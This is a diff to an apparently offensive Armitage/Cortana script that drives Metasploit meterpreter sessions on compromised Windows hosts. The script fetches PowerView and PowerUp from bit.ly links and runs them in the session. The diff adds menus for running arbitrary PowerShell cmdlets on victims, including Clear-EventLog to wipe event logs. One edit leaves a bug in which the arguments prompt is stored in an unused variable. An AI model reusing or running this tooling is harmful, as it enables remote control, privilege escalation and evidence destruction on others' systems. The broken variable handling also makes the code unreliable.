@@ -6,11 +6,11 @@
 #
 # Prerequisite: Place the remote_powershell.rb Metasploit module in your "metasploit-framework/modules/post/windows/manage/" directory.
 #
-# Created by: rvrsh3ll
+# Created by: rvrsh3ll	@424f424f
 #
 # Veil Project: https://github.com/Veil-Framework/
 # PowerView and PowerUp blog by harmj0y: http://blog.harmj0y.net/
-#
+# Misc. Powershell Commands: http://ss64.com/ps/
 #
 on session_sync {
 
@@ -28,7 +28,12 @@ on session_sync {
 				item "Custom Script" {
 					spawn(&customScript, $sid => $1);
 				}
-				
+				item "Misc. Local Commands" {
+					spawn(&miscCommands, $sid => $1);
+				}
+				item "Custom Local Command" {
+					spawn(&custLocCommands, $sid => $1);
+				}
 			}
 		}
 	}		
@@ -36,7 +41,7 @@ on session_sync {
 
 sub veilPowerView {
 		
-		global('$console @commands $args $setargs $argsprompt $command $scriptUrl');
+		global('$console @commands $args $argsprompt $command $scriptUrl');
 		$console = console();
 		$console = open_console_tab("meterpreter $sid");
 		$scriptUrl = prompt_text("URL to the PowerView script", "http://bit.ly/1mYPUO4");
@@ -85,8 +90,7 @@ sub veilPowerView {
 		
 			$argsprompt = prompt_confirm("Would you like to add arguments to this command?", "Yes", "No");
 				if ($argsprompt eq "0") {
-					$setargs = prompt_text("Enter your additional arguments");
-					$args = "$setargs";
+					$args = prompt_text("Enter your additional arguments");
 					$command = "$2 $args";
 				}
 								
@@ -112,7 +116,7 @@ sub veilPowerView {
 
 sub veilPowerUp {
 		
-		global('$console @commands $args $setargs $argsprompt $command $vpvuri $scriptUrl');
+		global('$console @commands $args $argsprompt $command $vpvuri $scriptUrl');
 		$console = console();
 		$console = open_console_tab("meterpreter $sid");
 		$scriptUrl = prompt_text("URL to the PowerUp script", "http://bit.ly/1mK64oH");
@@ -150,8 +154,7 @@ sub veilPowerUp {
 		
 			$argsprompt = prompt_confirm("Would you like to add arguments to this command?", "Yes", "No");
 				if ($argsprompt eq "0") {
-					$setargs = prompt_text("Enter your additional arguments");
-					$args = "$setargs";
+					$set = prompt_text("Enter your additional arguments");
 					$command = "$2 $args";
 				}
 								
@@ -185,6 +188,80 @@ sub customScript {
 
 }
 
+
+sub miscCommands {
+
+global('$localCmd $console @commands @information $scriptUrl $command $argsprompt');
+		
+		$console = console();
+		$console = open_console_tab("meterpreter $sid");
+		@commands = @(
+			%(commands => '$PSVersionTable', information => "Get Powershell Version"),
+			%(commands => 'Get-Service', information => "Provides a list of all of the services that are installed on the system"),
+			%(commands => 'Get-Process', information => "Display a list of all of the processes that are currently running on the system"),
+			%(commands => 'Stop-Process', information => "Stop a running process"),	
+			%(commands => 'Start-Process', information => "Start one or more processes"),	
+			%(commands => 'Get-EventLog', information => "Read EventLog"),
+			%(commands => 'Clear-EventLog', information => "Delete all entries from an event log"),	
+			%(commands => 'Get-Acl', information => "Get permission settings for a file or registry key"),
+			%(commands => 'Set-Acl', information => "Set Access Control List permissions from on a file (or object)."),
+			%(commands => 'Get-PSDrive', information => "Get drive information"),			
+			%(commands => 'Restart-Computer', information => "Restart the operating system on a computer")			
+			);
+		
+		
+		prompt_list("Misc. Commands", @("Run", "Cancel"), @('commands', 'information'), @commands, $null, 1000, 400); 
+		on item_selected {
+			
+			if ($1 eq "Run") {
+
+				
+				$argsprompt = prompt_confirm("Would you like to add arguments to this command?", "Yes", "No");
+				if ($argsprompt eq "0") {
+					$args = prompt_text("Enter your additional arguments");
+					$localCmd = "\"\& \{$2 $args\}\"";
+				}
+								
+				else if ($argsprompt eq "1") {
+						$args = $null;
+						$localCmd = "\"\& \{$2\}\"";
+				}
+				cmd($console, "use windows/manage/powershell/remote_powershell");
+				cmd_set($console, %(
+									SESSION => "$sid",
+									LOCAL 	=> "$localCmd"
+									));
+		
+				cmd($console, "run -j");
+				
+			}						
+			
+			else if ($1 eq "Cancel") {
+					return;
+			}
+									
+						on tab_close {
+									quit();
+						}
+		}
+}
+
+sub custLocCommands {
+	global('$localCmd $command');
+	$console = console();
+	$console = open_console_tab("meterpreter $sid");
+	$command = prompt_text("Enter your custom Cmdlet String to run with all arguments");
+	$localCmd = "\"\& \{$command\}\"";
+	cmd($console, "use windows/manage/powershell/remote_powershell");
+	cmd_set($console, %(
+						SESSION => "$sid",
+						LOCAL 	=> "$localCmd"
+						));
+	cmd($console, "run -j");
+}
+
+
+
 sub sendCommand {
 		cmd($console, "use windows/manage/powershell/remote_powershell");
 		cmd_set($console, %(
@@ -196,4 +273,3 @@ sub sendCommand {
 		cmd($console, "run -j");
 
 }
-
